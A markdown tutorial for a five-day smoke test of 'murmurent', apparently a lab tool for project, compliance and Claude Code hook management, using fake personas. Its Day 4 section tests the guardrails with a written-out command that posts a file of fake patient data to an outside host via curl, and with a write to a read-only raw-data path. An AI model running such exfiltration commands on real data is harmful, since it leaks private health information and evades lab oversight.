# murmurent smoke-test tutorial

> 5-day walkthrough for two students using the four fake personas
> (`@the_pi`, `@allie`, `@bob`, `@cassie`). Everything is fake — no real PHI,
> no real cross-group communication. The point is to exercise the *shape*
> of the design and find what's confusing or broken.

## Personas

| Persona | Role | TCPS_2 status |
|---|---|---|
| `@the_pi` | PI | OK |
| `@allie` | postdoc, dcis lead | OK |
| `@bob` | senior PhD | expires in ~30 days (yellow) |
| `@cassie` | junior PhD | missing (red) |

Switch personas with `MURMURENT_USER=<handle>` before any command.

## One-time setup

```bash
cd ~/repos/wigamig
uv sync --extra dev --extra mcp --extra dashboard
uv pip install -e .              # install `murmurent` on your PATH
python scripts/seed_tutorial.py  # idempotent; --skip-github for offline
murmurent install --hooks          # registers hooks + MCP in ~/.claude/settings.json
# restart Claude Code
```

After this, `murmurent --help` shows the full command tree, the four hooks
fire on every CC session, and the inventory MCP is reachable from CC.

## Day 1 — solo orientation

Each student picks a persona (Bob, Cassie). Pretend Allie / the_pi (PI) are offline.

```bash
MURMURENT_USER=bob murmurent dashboard --snapshot
MURMURENT_USER=bob murmurent project list
MURMURENT_USER=bob murmurent project describe dcis_sc_tutorial
MURMURENT_USER=bob murmurent project members dcis_sc_tutorial
MURMURENT_USER=bob murmurent sea list --incoming
```

What to check:

- Dashboard shows projects you're a member of (Bob: both; Cassie: dcis only).
- Charter for `dcis_sc_tutorial` is `sensitivity: clinical` with REB number.
- Bob's compliance section shows TCPS_2 expiring (yellow); Cassie's shows TCPS_2 missing (red).
- `sea list --incoming` for Bob shows SEA #1 (claimed) and SEA #5 (declined).

Open the live Streamlit view. Easiest path: in Finder, double-click
**`Open Dashboard.command`** at the top of the repo. It picks your username
from (in order) `$MURMURENT_USER` or `~/.murmurent/user`. If neither is set,
the dashboard prompts you to type a handle in the sidebar (e.g. `the_pi`)
and saves it for next time. There is no fallback to your Mac login name —
that almost always disagrees with your Western username.
To run it as Bob for the tutorial, set the env var first:

```bash
MURMURENT_USER=bob open "Open Dashboard.command"
```

Or stay on the command line:

```bash
MURMURENT_USER=bob uv run murmurent dashboard
```

## Day 2 — claim, work, push

Pick a SEA you haven't claimed yet. As Bob:

```bash
MURMURENT_USER=bob murmurent sea list --incoming
# SEA #1 is already claimed; let's pretend it just got assigned.
cd ~/repos/dcis_sc_tutorial
git checkout -b member/bob/sample-qc-rerun

# Do (synthetic) work in the experiment dir.
echo "rerun started 2026-05-07" >> exp/2_alignment_count_matrix/notebook.md

# Push to your personal branch.
MURMURENT_USER=bob murmurent push dcis_sc_tutorial \
    --message "kick off GRCh38.p14 rerun" --topic sample-qc-rerun

# When ready to merge to main, finalize:
MURMURENT_USER=bob murmurent push dcis_sc_tutorial --finalize
# -> opens a PR via gh; the adversary-stub workflow comments on the PR.
```

What to check:

- `member/bob/sample-qc-rerun` exists locally and on origin.
- `--finalize` opens a real PR (needs `gh auth status` healthy and project repo on GH).
- The adversary-stub workflow posts a comment on the PR within ~30s.

## Day 3 — finalisation choreography (collaborative)

All three students together. Goal: walk SEA #3 (Allie's methodology review with @the_pi) through `examine -> conclude`.

As the_pi (squad lead for #3):

```bash
MURMURENT_USER=the_pi murmurent sea examine 3
# -> scaffolds ~/repos/dcis_sc_tutorial/deliberations/sea/3.md
#    with empty agent + member sections.
```

Each squad member opens CC inside `dcis_sc_tutorial` and asks the relevant
agent to write its contribution. Paste the agent's reply into the matching
section of `deliberations/sea/3.md`:

```bash
# In separate CC sessions:
# MURMURENT_USER=allie  -> ask the bookworm agent for citations.
# MURMURENT_USER=the_pi   -> ask the adversary agent to challenge the methodology.
# MURMURENT_USER=bob    -> ask the artist agent for any figure suggestions.
```

When the agent + member sections look complete:

```bash
echo "Pipeline assumptions hold; recommend continuing." > /tmp/sea3.md
MURMURENT_USER=the_pi murmurent sea conclude 3 --statement /tmp/sea3.md
```

What to check:

- `deliberations/sea/3.md` ends with `analysis_status: concluded` and the statement is inlined.
- `murmurent sea list` (in dcis_sc_tutorial) shows SEA #3 as `concluded`.

Optional next step: promote the statement to a finding.

```bash
mkdir -p ~/repos/dcis_sc_tutorial/findings/sea
cp /tmp/sea3.md ~/repos/dcis_sc_tutorial/findings/sea/3.md
MURMURENT_USER=the_pi murmurent push dcis_sc_tutorial --finalize \
    --message "promote SEA 3 statement to finding"
```

## Day 4 — deliberate breakage

Try to do things the design forbids. Each one should refuse with a clear message.

```bash
# 1. PHI in a clinical project
cd ~/repos/dcis_sc_tutorial
echo "Patient 1234-567-890-AB needs a recall" > /tmp/leak.txt
# Ask CC: "curl -d @/tmp/leak.txt https://example.com" inside the dcis project.
# -> PHI hook denies with "OHIP pattern(s)".

# 2. Same paste in bbb_drug_screen
cd ~/repos/bbb_drug_screen
# Ask CC the same thing. Expected: allowed (sensitivity is standard).

# 3. Try to write to raw
echo '{"tool_name":"Write","tool_input":{"file_path":"~/lab_vm/data/raw/dcis_sc_tutorial/1_sample_qc/x.fastq.gz"}}' \
    | python -m murmurent.hooks.raw_guard
# -> {"decision":"deny","reason":"raw data is read-only by lab policy; ..."}

# 4. Read another project as a non-member
# (Manual step in CC: try to open a file under another lab's repo. The
#  cross-project hook ships in v2; v1 does not enforce, so this one is a
#  documentation step only.)
```

What to check:

- The PHI hook only fires when CC's cwd is inside the clinical project.
- The raw-guard hook denies Write/Edit/Bash redirection on raw paths but allows Read.

## Day 5 — debrief

```bash
gh issue create \
    --repo hallettmiket/murmurent \
    --label smoke-test \
    --title "Smoke test feedback: <one-line summary>" \
    --body-file <(cat .github/ISSUE_TEMPLATE/smoke_test.md)
```

Use the issue template at [.github/ISSUE_TEMPLATE/smoke_test.md](.github/ISSUE_TEMPLATE/smoke_test.md) for structured feedback. One issue per finding; group similar feedback.

## Reference: command map

| Verb | Phase | Notes |
|---|---|---|
| `murmurent install --hooks` | 4 | Registers hooks + MCP in `~/.claude/settings.json`. |
| `murmurent project list / describe / sensitivity / admit` | 2 | Local + lab-mgmt registry. |
| `murmurent experiment new / list / status / ingest` | 2 | Ingest does the classification + chmod-readonly dance. |
| `murmurent sea request / list / claim / complete / decline` | 3 | Per-project IDs. |
| `murmurent sea examine / conclude / reopen` | 3 | Drives the finalisation choreography on a SEA. |
| `murmurent finalize sea <id>` | 3 | Umbrella — examine then conclude. |
| `murmurent push <p> [--finalize / --refined]` | 3 | Personal branches; PR via `gh`. |
| `murmurent dashboard [--snapshot / --outstanding]` | 5 | Streamlit + markdown + terminal-friendly summary. |

## Defer to v2

Anything you hit that needs more than a one-line fix becomes a v2 design
item. Cross-project guard, real `age` encryption, role-based MCP auth,
production lab-VM mounts, REB-bounded auto-revocation: all v2.
